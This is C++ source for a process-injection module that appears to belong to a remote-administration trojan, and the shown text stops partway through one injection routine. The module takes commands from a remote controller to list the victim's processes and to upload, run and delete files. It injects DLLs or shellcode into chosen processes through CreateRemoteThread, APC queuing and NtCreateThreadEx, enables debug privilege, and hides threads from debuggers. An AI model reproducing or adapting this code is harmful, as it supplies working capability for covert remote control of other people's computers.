// ShellManager.cpp: implementation of the CInjectManager class.
//
//////////////////////////////////////////////////////////////////////
#include "stdafx.h"
#include "InjectManager.h"
#include <tlhelp32.h>
#include <psapi.h>
#pragma comment(lib,"Psapi.lib")
#include <Shlobj.h>
#include "C_bxsdk.h"
#include "yapi.hpp"





PidandStitle m_PidandStitle;
PidandStitle::iterator it_m_PidandStitle;

CInjectManager::CInjectManager(ISocketBase* pClient) :CManager(pClient)
{
	m_buser = FALSE;
	Flags = THREAD_CREATE_FLAGS_CREATE_SUSPENDED | THREAD_CREATE_FLAGS_SKIP_THREAD_ATTACH | THREAD_CREATE_FLAGS_HIDE_FROM_DEBUGGER;
	RecvDate = NULL;
	UINT	nRet = -1;
	LPBYTE	lpBuffer = getProcessList();
	if (lpBuffer == NULL)
		return;
	lpBuffer[0] = TOKEN_INJECT;
	if ((sizeof(int*) * 8) > 32)
	{
		lpBuffer[1] = 1;
		ClientIsx86 = FALSE;
	}
	else
	{
		lpBuffer[1] = 0;
		ClientIsx86 = TRUE;
	}
	Send((LPBYTE)lpBuffer, (int)LocalSize(lpBuffer));
	LocalFree(lpBuffer);


#ifdef _WIN64
	bxsdkbyte = new BYTE[bxsdk64MyFileSize];
	memcpy(bxsdkbyte, bxsdk64MyFileBuf, bxsdk64MyFileSize);
	 handle = ::MemoryLoadLibrary(bxsdkbyte, bxsdk64MyFileSize);
#else
	bxsdkbyte = new BYTE[bxsdk32MyFileSize];
	memcpy(bxsdkbyte, bxsdk32MyFileBuf, bxsdk32MyFileSize);
	 handle = ::MemoryLoadLibrary(bxsdkbyte, bxsdk32MyFileSize);
#endif
	if (handle != NULL)
	{
		MyBoxedAppSDK_SetContext = (fuBoxedAppSDK_SetContext)MemoryGetProcAddress(handle, "BoxedAppSDK_SetContext");
		MyBoxedAppSDK_Init = (fuBoxedAppSDK_Init)MemoryGetProcAddress(handle, "BoxedAppSDK_Init");
		MyBoxedAppSDK_SetBxSdkRawData = (fuBoxedAppSDK_SetBxSdkRawData)MemoryGetProcAddress(handle, "BoxedAppSDK_SetBxSdkRawData");
		MyBoxedAppSDK_Exit = (fuBoxedAppSDK_Exit)MemoryGetProcAddress(handle, "BoxedAppSDK_Exit");
		MyBoxedAppSDK_CreateVirtualFileW = (fuBoxedAppSDK_CreateVirtualFileW)MemoryGetProcAddress(handle, "BoxedAppSDK_CreateVirtualFileW");
		MyBoxedAppSDK_DeleteFileFromVirtualFileSystemW = (fuBoxedAppSDK_DeleteFileFromVirtualFileSystemW)MemoryGetProcAddress(handle, "BoxedAppSDK_DeleteFileFromVirtualFileSystemW");
		MyBoxedAppSDK_EnableOption = (fuBoxedAppSDK_EnableOption)MemoryGetProcAddress(handle, "BoxedAppSDK_EnableOption");
		MyBoxedAppSDK_RemoteProcess_EnableOption = (fuBoxedAppSDK_RemoteProcess_EnableOption)MemoryGetProcAddress(handle, "BoxedAppSDK_RemoteProcess_EnableOption");
		MyBoxedAppSDK_AttachToProcess = (fuBoxedAppSDK_AttachToProcess)MemoryGetProcAddress(handle, "BoxedAppSDK_AttachToProcess");
		MyBoxedAppSDK_DetachFromProcess = (fuBoxedAppSDK_DetachFromProcess)MemoryGetProcAddress(handle, "BoxedAppSDK_DetachFromProcess");
		MyBoxedAppSDK_EmulateBoxedAppSDKDLL = (fuBoxedAppSDK_EmulateBoxedAppSDKDLL)MemoryGetProcAddress(handle, "BoxedAppSDK_EmulateBoxedAppSDKDLL");
		MyBoxedAppSDK_SetBxSdk64DllPathW = (fuBoxedAppSDK_SetBxSdk64DllPathW)MemoryGetProcAddress(handle, "BoxedAppSDK_SetBxSdk64DllPathW");
		MyBoxedAppSDK_SetBxSdk32DllPathW = (fuBoxedAppSDK_SetBxSdk32DllPathW)MemoryGetProcAddress(handle, "BoxedAppSDK_SetBxSdk32DllPathW");
		MyBoxedAppSDK_EnableDebugLog = (fuBoxedAppSDK_EnableDebugLog)MemoryGetProcAddress(handle, "BoxedAppSDK_EnableDebugLog");
		(*MyBoxedAppSDK_SetContext)(INITCODE);
		BoxedAppSDK_Init_IsOK = (*MyBoxedAppSDK_Init)();
		if (!BoxedAppSDK_Init_IsOK) return;
#ifdef _WIN64
		(*MyBoxedAppSDK_SetBxSdkRawData)(bxsdk64MyFileBuf, bxsdk64MyFileSize);
#else
		(*MyBoxedAppSDK_SetBxSdkRawData)(bxsdk32MyFileBuf, bxsdk32MyFileSize);
#endif
		(*MyBoxedAppSDK_EmulateBoxedAppSDKDLL)();
		(*MyBoxedAppSDK_EnableOption)(DEF_BOXEDAPPSDK_OPTION__EMBED_BOXEDAPP_IN_CHILD_PROCESSES, TRUE);
	}
	else
	{
		BoxedAppSDK_Init_IsOK = FALSE;
	}

	//TCHAR path[MAX_PATH] = { 0 };
	//memset(path, 0, sizeof(path));
	//GetModuleFileName(NULL, path, sizeof(path));
	//std::wstring filename = path;
	//const size_t last_slash_idx = filename.rfind('\\') + 1;
	//if (std::wstring::npos != last_slash_idx)
	//{
	//	directory = filename.substr(0, last_slash_idx);
	//}

#ifdef _DEBUG
	(*MyBoxedAppSDK_EnableDebugLog)(TRUE);
#endif // _DEBUG
	m_buser = TRUE;
	NotifyDialogIsOpen();

}

CInjectManager::~CInjectManager()
{
	if (!m_buser) return;
	if (RecvDate != NULL)
	{
		SAFE_DELETE_AR(RecvDate);
	}
	(*MyBoxedAppSDK_Exit)();
	//MemoryFreeLibrary(handle);
	SAFE_DELETE_AR(bxsdkbyte);
}

void CInjectManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
{
	if (lpBuffer[0] == TOKEN_HEARTBEAT) return;
	switch (lpBuffer[0])
	{

	case COMMAND_INJECT_PROCESS:
		SendProcessList();
		break;
	case COMMAND_INJECT_FILE_INFO:
		CreateLocalRecvFile(lpBuffer + 1);
		break;
	case COMMAND_INJECT_FILE_DATA:				// 下载数据, 对于控制端来说是上传数据, 被控端将保存数据到之前创建的空文件
		WriteLocalRecvFile(lpBuffer + 1, nSize - 1);
		break;
	case COMMAND_INJECT_FILE_SENDOK:
		WriteOk();
		break;
	case COMMAND_INJECT_REMOTEFILE_RUN:
		RunExe(lpBuffer + 1);
		break;
	case COMMAND_INJECT_REMOTEFILE_DEL:
		DelFile(lpBuffer + 1);
		break;
	case 	COMMAND_INJECT_SETDLL:
	{
		WriteDllandSetPath(TRUE, _T("\\bxsdk32.key"));
		WriteDllandSetPath(FALSE, _T("\\bxsdk64.key"));
	}
	break;
	case COMMAND_INJECT_MODE:
	{
		if (BoxedAppSDK_Init_IsOK)
		{
			memcpy(&m_sinjectmode, lpBuffer + 1, sizeof(INJECTMODE));
			switch (m_sinjectmode.einjectmode)
			{
			case MODE_CreateRemoteThread_dll:
			case MODE_QueueUserAPC_dll:
			case MODE_NtCreateThreadEx_dll:
				Inject_dll();
				break;
			case MODE_CreateRemoteThread_shellcode:
			case MODE_QueueUserAPC_shellcode:
			case MODE_NtCreateThreadEx_shellcode:
				Inject_shellcode();
				break;
			default:
				break;
			}
		}
		else
		{
			SendError(_T("远程初始化失败"));
		}

	}
	break;
	case COMMAND_INJECT_REMOTEFILE_RUN_ARG:
		RunExeuacArg(lpBuffer + 1);
		break;
	default:

		break;
	}

}

void CInjectManager::SendProcessList()
{
	UINT	nRet = -1;
	LPBYTE	lpBuffer = getProcessList();
	if (lpBuffer == NULL)
		return;

	Send((LPBYTE)lpBuffer, (int)LocalSize(lpBuffer));
	LocalFree(lpBuffer);
}

BOOL CInjectManager::DebugPrivilege(const TCHAR* PName, BOOL bEnable)
{
	BOOL              bResult = TRUE;
	HANDLE            hToken;
	TOKEN_PRIVILEGES  TokenPrivileges;

	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, &hToken))
	{
		bResult = FALSE;
		return bResult;
	}
	TokenPrivileges.PrivilegeCount = 1;
	TokenPrivileges.Privileges[0].Attributes = bEnable ? SE_PRIVILEGE_ENABLED : 0;

	LookupPrivilegeValue(NULL, PName, &TokenPrivileges.Privileges[0].Luid);
	AdjustTokenPrivileges(hToken, FALSE, &TokenPrivileges, sizeof(TOKEN_PRIVILEGES), NULL, NULL);
	if (GetLastError() != ERROR_SUCCESS)
	{
		bResult = FALSE;
	}

	CloseHandle(hToken);
	return bResult;
}


BOOL CInjectManager::GetProcessUserName(HANDLE hProcess, TCHAR* strProcessUser)
{
	HANDLE hToken = NULL;
	BOOL bFuncReturn = FALSE;
	PTOKEN_USER pToken_User = NULL;
	DWORD dwTokenUser = 0;
	TCHAR szAccName[MAX_PATH] = { 0 };
	TCHAR szDomainName[MAX_PATH] = { 0 };
	HANDLE hProcessToken = NULL;
	if (hProcess != NULL)
	{
		// 提升本进程的权限
		bFuncReturn = ::OpenProcessToken(hProcess, TOKEN_QUERY, &hToken);
		if (bFuncReturn == 0) // 失败
			return FALSE;

		if (hToken != NULL)
		{
			::GetTokenInformation(hToken, TokenUser, NULL, 0L, &dwTokenUser);
			if (dwTokenUser > 0)
			{
				pToken_User = (PTOKEN_USER)::GlobalAlloc(GPTR, dwTokenUser);
			}

			if (pToken_User != NULL)
			{
				bFuncReturn = ::GetTokenInformation(hToken, TokenUser, pToken_User, dwTokenUser, &dwTokenUser);
			}

			if (bFuncReturn != FALSE && pToken_User != NULL)
			{
				SID_NAME_USE eUse = SidTypeUnknown;
				DWORD dwAccName = 0L;
				DWORD dwDomainName = 0L;
				PSID  pSid = pToken_User->User.Sid;
				bFuncReturn = ::LookupAccountSid(NULL, pSid, NULL, &dwAccName,
					NULL, &dwDomainName, &eUse);

				if (dwAccName > 0 && dwAccName < MAX_PATH && dwDomainName>0 && dwDomainName <= MAX_PATH)
				{
					bFuncReturn = ::LookupAccountSid(NULL, pSid, szAccName, &dwAccName,
						szDomainName, &dwDomainName, &eUse);
				}

				if (bFuncReturn != 0)
					lstrcpy(strProcessUser, szAccName);

			}
		}
	}

	if (pToken_User != NULL)
		::GlobalFree(pToken_User);

	if (hToken != NULL)
		::CloseHandle(hToken);

	return TRUE;
}

BOOL CInjectManager::DosPathToNtPath(LPTSTR pszDosPath, LPTSTR pszNtPath)
{
	TCHAR			szDriveStr[500];
	TCHAR			szDrive[3];
	TCHAR			szDevName[100];
	INT				cchDevName;
	INT				i;

	//检查参数
	if (!pszDosPath || !pszNtPath)
		return FALSE;

	//获取本地磁盘字符串
	if (GetLogicalDriveStrings(sizeof(szDriveStr), szDriveStr))
	{
		for (i = 0; szDriveStr[i]; i += 4)
		{
			if (!lstrcmpi(&(szDriveStr[i]), _T("A:\\")) || !lstrcmpi(&(szDriveStr[i]), _T("B:\\")))
				continue;

			szDrive[0] = szDriveStr[i];
			szDrive[1] = szDriveStr[i + 1];
			szDrive[2] = _T('\0');
			if (!QueryDosDevice(szDrive, szDevName, 100))//查询 Dos 设备名
				return FALSE;

			cchDevName = lstrlen(szDevName);
			if (_tcsnccmp(pszDosPath, szDevName, cchDevName) == 0)//命中
			{
				lstrcpy(pszNtPath, szDrive);//复制驱动器
				lstrcat(pszNtPath, pszDosPath + cchDevName);//复制路径
				return TRUE;
			}
		}
	}

	lstrcpy(pszNtPath, pszDosPath);

	return FALSE;
}

bool CInjectManager::Is64BitOS()
{
	typedef VOID(WINAPI* LPFN_GetNativeSystemInfo)(__out LPSYSTEM_INFO lpSystemInfo);
	LPFN_GetNativeSystemInfo fnGetNativeSystemInfo = (LPFN_GetNativeSystemInfo)GetProcAddress(GetModuleHandleW(L"kernel32"), "GetNativeSystemInfo");
	if (fnGetNativeSystemInfo)
	{
		SYSTEM_INFO stInfo = { 0 };
		fnGetNativeSystemInfo(&stInfo);
		if (stInfo.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_IA64
			|| stInfo.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64)
		{
			return true;
		}
	}
	return false;
}


bool CInjectManager::Is64BitPorcess(DWORD dwProcessID)
{
	if (!Is64BitOS())
	{
		return FALSE;
	}
	else
	{
		HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, dwProcessID);
		if (hProcess)
		{
			typedef BOOL(WINAPI* LPFN_ISWOW64PROCESS) (HANDLE, PBOOL);
			LPFN_ISWOW64PROCESS fnIsWow64Process = (LPFN_ISWOW64PROCESS)GetProcAddress(GetModuleHandleW(L"kernel32"), "IsWow64Process");
			if (NULL != fnIsWow64Process)
			{
				BOOL bIsWow64 = false;
				fnIsWow64Process(hProcess, &bIsWow64);
				CloseHandle(hProcess);
				if (bIsWow64)
				{
					return false;
				}
				else
				{
					return true;
				}
			}
		}
	}
	return false;
}

static BOOL CALLBACK lpEnumFunc(HWND hwnd, LPARAM lParam)
{

	if (NULL == hwnd)
	{
		return TRUE;
	}
	if (!::IsWindow(hwnd))
		return TRUE;

	if (!IsWindowVisible(hwnd))
		return TRUE;
	DWORD  processId;
	GetWindowThreadProcessId(
		hwnd,			// 窗口句柄
		&processId		// 接收 PID 的指针
	);

	int i = GetWindowTextLength(hwnd);
	TCHAR szBuf_title[MAX_PATH];
	if (i > (MAX_PATH - 1)) return TRUE;
	GetWindowText(
		hwnd,					// 窗口句柄
		szBuf_title,		// 接收窗口标题的缓冲区指针
		i + 1			// 缓冲区字节大小
	);

	std::wstring* str_title = new std::wstring;
	*str_title = szBuf_title;
	m_PidandStitle.insert(MAKE_PAIR(PidandStitle, processId, str_title));
	return TRUE;
}


LPBYTE CInjectManager::getProcessList()
{
	HANDLE			hSnapshot = NULL;
	HANDLE			hProcess = NULL;
	HMODULE			hModules = NULL;
	PROCESSENTRY32	pe32 = { 0 };
	DWORD			cbNeeded;
	TCHAR			strProcessName[MAX_PATH] = { 0 };
	TCHAR            strProcessUser[MAX_PATH] = { 0 };
	TCHAR           szImagePath[MAX_PATH] = { 0 };
	LPBYTE			lpBuffer = NULL;
	DWORD			dwOffset = 0;
	DWORD			dwLength = 0;
	DWORD           dwWorkingSetSize = 0;
	DWORD           dwFileSize = 0;
	PROCESS_MEMORY_COUNTERS pmc;
	DebugPrivilege(SE_DEBUG_NAME, TRUE);

	hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

	if (hSnapshot == INVALID_HANDLE_VALUE)
		return NULL;

	pe32.dwSize = sizeof(PROCESSENTRY32);

	lpBuffer = (LPBYTE)LocalAlloc(LPTR, 1024);

	lpBuffer[0] = TOKEN_INJECT_PROCESS;
	dwOffset = 2;

	m_PidandStitle.clear();
	it_m_PidandStitle = m_PidandStitle.begin();
	while (it_m_PidandStitle != m_PidandStitle.end())
	{
		SAFE_DELETE(it_m_PidandStitle->second);
		m_PidandStitle.erase(it_m_PidandStitle++);

	}

	EnumWindows(lpEnumFunc, NULL);

	if (Process32First(hSnapshot, &pe32))
	{
		do
		{
			hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pe32.th32ProcessID);
			if ((pe32.th32ProcessID != 0) && (pe32.th32ProcessID != 4) && (pe32.th32ProcessID != 8))
			{
				EnumProcessModules(hProcess, &hModules, sizeof(hModules), &cbNeeded);

				if (0 == GetProcessImageFileName(hProcess, szImagePath, MAX_PATH))
				{
					lstrcpy(strProcessName, _T("---"));

				}
				else if (!DosPathToNtPath(szImagePath, strProcessName))
				{

				}

				memset(strProcessUser, 0, sizeof(strProcessUser));
				if (GetProcessUserName(hProcess, strProcessUser))
				{
					if (lstrlen(strProcessUser) == 0)
					{
						lstrcpy(strProcessUser, _T("--"));
					}
				}
				else
				{
					lstrcpy(strProcessUser, _T("-"));
				}

				// 此进程占用数据大小
				dwLength = sizeof(DWORD) * 5 + sizeof(bool) + MAX_PATH * sizeof(TCHAR) + lstrlen(pe32.szExeFile) * sizeof(TCHAR) + lstrlen(strProcessName) * sizeof(TCHAR) + lstrlen(strProcessUser) * sizeof(TCHAR) + 6;
				// 缓冲区太小，再重新分配下
				if (LocalSize(lpBuffer) < (dwOffset + dwLength))
					lpBuffer = (LPBYTE)LocalReAlloc(lpBuffer, (dwOffset + dwLength), LMEM_ZEROINIT | LMEM_MOVEABLE);

				memcpy(lpBuffer + dwOffset, &(pe32.th32ProcessID), sizeof(DWORD));
				dwOffset += sizeof(DWORD);


				bool is64 = Is64BitPorcess(pe32.th32ProcessID);
				memcpy(lpBuffer + dwOffset, &is64, sizeof(bool));
				dwOffset += sizeof(bool);

				//GetHWndsByProcessID(pe32.th32ProcessID);
				it_m_PidandStitle = m_PidandStitle.find(pe32.th32ProcessID);
				if (it_m_PidandStitle == m_PidandStitle.end())  //没有在列表就断开连接 让客户端重新发送登录信息
				{
					memcpy(lpBuffer + dwOffset, _T(""), MAX_PATH * sizeof(TCHAR));
				}
				else
				{
					std::wstring* str_title = it_m_PidandStitle->second;

					memcpy(lpBuffer + dwOffset, str_title->c_str(), str_title->length() * sizeof(TCHAR));

				}
				dwOffset += MAX_PATH * sizeof(TCHAR);

				memcpy(lpBuffer + dwOffset, pe32.szExeFile, lstrlen(pe32.szExeFile) * sizeof(TCHAR) + 2);
				dwOffset += lstrlen(pe32.szExeFile) * sizeof(TCHAR) + 2;

				memcpy(lpBuffer + dwOffset, strProcessName, lstrlen(strProcessName) * sizeof(TCHAR) + 2);
				dwOffset += lstrlen(strProcessName) * sizeof(TCHAR) + 2;


				DWORD dwPriClass = GetPriorityClass(hProcess);
				memcpy(lpBuffer + dwOffset, &dwPriClass, sizeof(DWORD));
				dwOffset += sizeof(DWORD);

				dwPriClass = pe32.cntThreads;
				memcpy(lpBuffer + dwOffset, &dwPriClass, sizeof(DWORD));
				dwOffset += sizeof(DWORD);

				memcpy(lpBuffer + dwOffset, strProcessUser, lstrlen(strProcessUser) * sizeof(TCHAR) + 2);
				dwOffset += lstrlen(strProcessUser) * sizeof(TCHAR) + 2;

				ZeroMemory(&pmc, sizeof(pmc));
				pmc.cb = sizeof(PROCESS_MEMORY_COUNTERS);
				if (GetProcessMemoryInfo(hProcess, &pmc, sizeof(pmc)))
				{
					dwWorkingSetSize = (DWORD)(pmc.WorkingSetSize / 1024);		//单位为k
				}
				else
					dwWorkingSetSize = 0;

				memcpy(lpBuffer + dwOffset, &dwWorkingSetSize, sizeof(DWORD));
				dwOffset += sizeof(DWORD);


				HANDLE handle = CreateFile(strProcessName, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, 0, 0);
				if (handle != INVALID_HANDLE_VALUE)
				{
					dwFileSize = GetFileSize(handle, NULL) / 1024;
					CloseHandle(handle);
				}
				else
					dwFileSize = 0;

				memcpy(lpBuffer + dwOffset, &dwFileSize, sizeof(DWORD));
				dwOffset += sizeof(DWORD);

			}

			CloseHandle(hProcess);//新修改
		} while (Process32Next(hSnapshot, &pe32));
	}

	lpBuffer = (LPBYTE)LocalReAlloc(lpBuffer, dwOffset, LMEM_ZEROINIT | LMEM_MOVEABLE);

	DebugPrivilege(SE_DEBUG_NAME, FALSE);
	CloseHandle(hSnapshot);
	return lpBuffer;
}

void CInjectManager::SendError(TCHAR* Terror)
{
	int nlen = lstrlen(Terror) * sizeof(TCHAR) + 4;
	BYTE* pbuffer = new BYTE[nlen];
	ZeroMemory(pbuffer, nlen);
	pbuffer[0] = TOKEN_INJECT_MSG;
	memcpy(pbuffer + 1, Terror, nlen - 4);
	Send(pbuffer, nlen);
	SAFE_DELETE_AR(pbuffer);
}

void CInjectManager::CreateLocalRecvFile(LPBYTE lpBuffer)
{
	if (!BoxedAppSDK_Init_IsOK)
	{
		SendError(_T("虚拟目录初始化失败无法使用远程目录"));
		return;
	}

	memcpy(&m_fileinfo, lpBuffer, sizeof(FILEINFO));
	if (RecvDate != NULL)
	{
		SAFE_DELETE_AR(RecvDate);
	}

	RecvDate = new BYTE[m_fileinfo.SendFileLength];
	if (RecvDate == 0)
		SendError(_T("远程机器申请内存失败，可能文件太大"));
	offsetsize = 0;
	BYTE	bToken;
	bToken = TOKEN_INJECT_STARTSEND;
	Send(&bToken, 1);
}

void CInjectManager::WriteLocalRecvFile(LPBYTE lpBuffer, UINT nSize)
{
	// 便宜memcpy 记录偏移
	memcpy(RecvDate + offsetsize, lpBuffer, nSize);
	offsetsize += nSize;
	BYTE	bToken;
	bToken = TOKEN_INJECT_STARTSEND;
	Send(&bToken, 1);
}

void CInjectManager::WriteOk()
{
	HANDLE VmFile = (*MyBoxedAppSDK_CreateVirtualFileW)(m_fileinfo.m_SendName, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_NEW, 0, NULL);
	DWORD dwTemp;
	WriteFile(VmFile, RecvDate, m_fileinfo.SendFileLength, &dwTemp, NULL);
	CloseHandle(VmFile);
	SAFE_DELETE_AR(RecvDate);
}

void CInjectManager::WriteDllandSetPath(BOOL isx86, TCHAR* lpBuffer)
{
	TCHAR szPath[MAX_PATH];
	SHGetFolderPath(NULL, CSIDL_COMMON_APPDATA, NULL, SHGFP_TYPE_CURRENT, szPath);
	lstrcat(szPath, lpBuffer);
	HANDLE VmFile = CreateFile(szPath, GENERIC_WRITE, FILE_SHARE_WRITE, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	DWORD dwTemp;


	if (isx86)
	{
		WriteFile(VmFile, bxsdk32MyFileBuf, bxsdk32MyFileSize, &dwTemp, NULL);
		CloseHandle(VmFile);
		MyBoxedAppSDK_SetBxSdk32DllPathW(szPath);
	}
	else
	{
		WriteFile(VmFile, bxsdk64MyFileBuf, bxsdk64MyFileSize, &dwTemp, NULL);
		CloseHandle(VmFile);
		MyBoxedAppSDK_SetBxSdk64DllPathW(szPath);
	}

}

void CInjectManager::RunExe(LPBYTE lpBuffer)
{
	STARTUPINFO StartupInfo = { 0 };
	PROCESS_INFORMATION ProcInfo = { nullptr };
	if (!CreateProcess((TCHAR*)lpBuffer, nullptr, nullptr, nullptr, FALSE, 0, nullptr, nullptr, &StartupInfo, &ProcInfo))
	{
		SendError(_T("执行失败"));
	}
	else
	{
		TCHAR wsUpdate[MAX_PATH];
		wsprintf(wsUpdate, _T("执行成功 PID ：%d "), ProcInfo.dwProcessId);
		SendError(wsUpdate);
	}
	//	TCHAR* ExeName = (TCHAR*)lpBuffer;
	//
	//	int exportnamelen = WideCharToMultiByte(CP_ACP, 0, ExeName, -1, NULL, 0, NULL, NULL);
	//	char* exportnamebuf = new char[exportnamelen + 1];
	//	WideCharToMultiByte(CP_ACP, 0, ExeName, -1, exportnamebuf, exportnamelen, NULL, NULL);
	//	UINT ret =WinExec(exportnamebuf, SW_SHOW);
	//	SAFE_DELETE_AR(exportnamebuf);
	//
	//	if (ret<32)
	//	  {
	//	SendError(_T("执行失败"));
	//}
	//else
	//{
	//	SendError(_T("执行成功"));
	//}



}



void CInjectManager::RunExeuacArg(LPBYTE lpBuffer)
{
	TCHAR* ExeName = (TCHAR*)lpBuffer;

	int exportnamelen = WideCharToMultiByte(CP_ACP, 0, ExeName, -1, NULL, 0, NULL, NULL);
	char* exportnamebuf = new char[exportnamelen + 1];
	WideCharToMultiByte(CP_ACP, 0, ExeName, -1, exportnamebuf, exportnamelen, NULL, NULL);
	UINT ret = WinExec(exportnamebuf, SW_SHOW);
	SAFE_DELETE_AR(exportnamebuf);

	if (ret < 32)
	{
		SendError(_T("执行失败"));
	}
	else
	{
		SendError(_T("执行成功"));
	}

}



void CInjectManager::DelFile(LPBYTE lpBuffer)
{

	DWORD ret = (*MyBoxedAppSDK_DeleteFileFromVirtualFileSystemW)((TCHAR*)lpBuffer);
	if (ret)
	{
		SendError(_T("删除成功"));
	}
	else
	{
		SendError(_T("删除失败"));
	}
}

HANDLE WINAPI ThreadProc(PTHREAD_DATA data)
{

	data->fnRtlInitUnicodeString(&data->UnicodeString, data->DllName);
	data->fnLdrLoadDll(data->DllPath, data->Flags, &data->UnicodeString, &data->ModuleHandle);
	return data->ModuleHandle;
}

DWORD WINAPI ThreadProcEnd()
{
	return 0;
}


void CInjectManager::Inject_dll()
{
	SYSTEMTIME current_time;
	GetLocalTime(&current_time);
	wsprintf(m_sinjectmode.WritePath, _T("%s\\%u%u%u%u.dll"), m_sinjectmode.WritePath, current_time.wHour, current_time.wMinute, current_time.wSecond, current_time.wMilliseconds);
	HANDLE VmFile = CreateFile(m_sinjectmode.WritePath, GENERIC_WRITE, FILE_SHARE_WRITE, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (VmFile == INVALID_HANDLE_VALUE)
	{
		SendError(_T("创建落地路径文件失败"));
		return;
	}
	HANDLE hFile = CreateFile(m_sinjectmode.DllName, GENERIC_READ, 0, NULL, OPEN_ALWAYS, 0, NULL);
	if (hFile == INVALID_HANDLE_VALUE)
	{
		SendError(_T("打开虚拟文件失败"));
		return;
	}
	DWORD dwSize = 0;
	dwSize = GetFileSize(hFile, NULL);
	LPBYTE lpAddress = new BYTE[dwSize];
	if (lpAddress == NULL)
	{
		SendError(_T("VirtualAlloc Error"));
		CloseHandle(hFile);
		return;
	}
	DWORD dwRead = 0;
	ReadFile(hFile, lpAddress, dwSize, &dwRead, 0);

	DWORD dwTemp;
	WriteFile(VmFile, lpAddress, dwSize, &dwTemp, NULL);
	CloseHandle(VmFile);
	SAFE_DELETE_AR(lpAddress);
	HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, m_sinjectmode.dwProcessID);
	if (hProc == NULL)
	{
		SendError(_T("打开进程失败 "));
		return;
	}






	switch (m_sinjectmode.einjectmode)
	{
	case MODE_CreateRemoteThread_dll:
	{
		yapi::YAPICall LoadLibraryA(hProc, _T("kernel32.dll"), "LoadLibraryW");
		if (m_sinjectmode.ExeIsx86)
		{
			DWORD64 x86Dll = LoadLibraryA(m_sinjectmode.WritePath);
			SendError(_T("注入32位dll成功"));
		}
		else
		{
			DWORD64 x64Dll = LoadLibraryA.Dw64()(m_sinjectmode.WritePath);
			SendError(_T("注入64位dll成功"));
		}
	}
	break;


	case MODE_QueueUserAPC_dll:
	{
		FARPROC fpAddresses[5] = {
		GetProcAddress(GetModuleHandle(_T("ntdll.dll")), "NtAllocateVirtualMemory"),
		GetProcAddress(GetModuleHandle(_T("ntdll.dll")), "NtWriteVirtualMemory"),
		GetProcAddress(GetModuleHandle(_T("ntdll.dll")), "NtSuspendThread"),
		GetProcAddress(GetModuleHandle(_T("ntdll.dll")), "NtAlertResumeThread"),
		GetProcAddress(GetModuleHandle(_T("ntdll.dll")), "NtQueueApcThread")
		};

		pNtAllocateVirtualMemory fNtAllocateVirtualMemory = (pNtAllocateVirtualMemory)fpAddresses[0];
		pNtWriteVirtualMemory fNtWriteVirtualMemory = (pNtWriteVirtualMemory)fpAddresses[1];
		pNtSuspendThread fNtSuspendThread = (pNtSuspendThread)fpAddresses[2];
		pNtAlertResumeThread fNtAlertResumeThread = (pNtAlertResumeThread)fpAddresses[3];
		pNtQueueApcThread fNtQueueApcThread = (pNtQueueApcThread)fpAddresses[4];

		HANDLE hThreadSnap = INVALID_HANDLE_VALUE;
		THREADENTRY32 te32;
		hThreadSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
		if (hThreadSnap == INVALID_HANDLE_VALUE) {
			SendError(_T("无法获取线程快照"));
			break;
		}
		te32.dwSize = sizeof(THREADENTRY32);
		DWORD threadId;
		if (!Thread32First(hThreadSnap, &te32)) {
			SendError(_T("无法获得第一个线程"));
			break;
		}
		do {
			if (te32.th32OwnerProcessID == m_sinjectmode.dwProcessID) {
				threadId = te32.th32ThreadID;
				HANDLE hThread = OpenThread(THREAD_SET_CONTEXT, FALSE, threadId);
				if (hThread) {
					LPVOID pDllPath = VirtualAllocEx(hProc, 0, lstrlen(m_sinjectmode.WritePath) * sizeof(TCHAR), MEM_COMMIT, PAGE_READWRITE);
					WriteProcessMemory(hProc, pDllPath, LPVOID(m_sinjectmode.WritePath), lstrlen(m_sinjectmode.WritePath) * sizeof(TCHAR), NULL);

					if (fNtSuspendThread)
					{
						ULONG SuspendCount = 0;
						fNtSuspendThread(hThread, &SuspendCount);
					}
					LPVOID LoadLibAddr = GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryW");
					DWORD dwResult = fNtQueueApcThread(hThread, (PIO_APC_ROUTINE)LoadLibAddr, pDllPath, NULL, NULL);
					if (fNtAlertResumeThread)
					{
						ULONG SuspendCount = 0;
						fNtAlertResumeThread(hThread, &SuspendCount);
					}
					if (dwResult) {
						SendError(_T("有效载荷在线程中成功注入"));
						break;;
					}
					else
					{
						SendError(_T("调用错误QueueUSerAPC().继续尝试其他线程"));
						continue;
					}
				}
				else {
					SendError(_T("获取找到的线程 ID 时出错"));
					break;;
				}
			}
		} while (Thread32Next(hThreadSnap, &te32));

		if (!threadId)
			SendError(_T("没有线程用于进程"));
		CloseHandle(hThreadSnap);
		return;

	}
	break;
	case MODE_NtCreateThreadEx_dll:
	{
		HANDLE      hThread = NULL;
		LPVOID pThreadData = NULL;
		THREAD_DATA  data;
		LPVOID  pCode = NULL;
		HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
		if (hNtdll == NULL)
		{
			SendError(_T("ntdll.dll error"));
			break;
		}
		data.fnRtlInitUnicodeString = (pRtlInitUnicodeString)GetProcAddress(hNtdll, "RtlInitUnicodeString");
		data.fnLdrLoadDll = (pLdrLoadDll)GetProcAddress(hNtdll, "LdrLoadDll");
		memcpy(data.DllName, m_sinjectmode.WritePath, (lstrlen(m_sinjectmode.WritePath) + 1) * sizeof(WCHAR));
		data.DllPath = NULL;
		data.Flags = 0;
		data.ModuleHandle = INVALID_HANDLE_VALUE;
		pThreadData = VirtualAllocEx(hProc, NULL, 4096, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
		if (pThreadData == NULL)
		{
			SendError(_T("VirtualAllocEx error"));
			break;
		}
